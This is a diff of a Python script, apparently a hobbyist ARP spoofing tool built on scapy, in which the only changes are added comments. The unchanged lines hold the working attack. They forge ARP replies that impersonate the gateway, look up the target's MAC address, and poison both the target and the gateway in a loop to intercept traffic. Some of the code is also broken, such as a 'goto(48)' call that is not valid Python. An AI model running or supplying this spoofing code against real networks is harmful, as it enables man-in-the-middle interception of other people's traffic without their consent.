@@ -11,13 +11,13 @@ try:
     mac_address = get_mac(target_ip)
     packet = scapy.ARP(psrc = gateway,hwdst = mac_address,pdst = target_ip,op = 2)
     scapy.send(packet,verbose = False)
- def get_mac(ip):
+ def get_mac(ip): #get mac address from the network
    request = scapy.ARP(pdst = ip)
    brodcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_brodcast = brodcast/request
    useful = scapy.srp(arp_brodcast, timeout = 1,verbose = False)[0]
    return useful[0][1].hwsrc
- def get_value():
+ def get_value(): #takes target ip and gateway as inputs
     parser = optparse.OptionParser()
     parser.add_option("-t","--target",dest = "target_ip",help = "Enter the Target ip")
     parser.add_option("-g","--gateway",dest = "gateway",help = "Enter the gateway")
@@ -40,7 +40,7 @@ try:
     arp_request(option.gateway,option.target_ip)
     arp_request(option.target_ip,option.gateway)
     counter = counter + 2
-    print("\rpacket >> " + str(counter),end="")
+    print("\rpacket >> " + str(counter),end="") #counts the no. of packets sent
     time.sleep(2)
  except IndexError:
     goto(48)
